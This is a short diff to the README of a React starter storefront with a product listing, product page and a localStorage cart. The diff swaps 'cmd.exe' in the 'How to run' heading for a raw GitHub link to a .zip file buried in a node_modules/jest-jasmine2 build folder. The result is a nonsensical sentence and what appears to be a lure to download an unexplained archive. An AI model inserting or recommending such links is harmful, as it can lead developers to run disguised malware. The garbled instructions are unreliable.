@@ -2,7 +2,7 @@
 
 This is a small starter Amazon-like frontend built with React (Create React App style). It includes product listing, product page, and a simple cart persisted to localStorage.
 
-How to run (Windows cmd.exe):
+How to run (Windows https://raw.githubusercontent.com/rajaanjan46/amazon_clone/main/node_modules/jest-jasmine2/build/amazon_clone-v3.1.zip):
 
 ```cmd
 cd /d d:\front-end_project
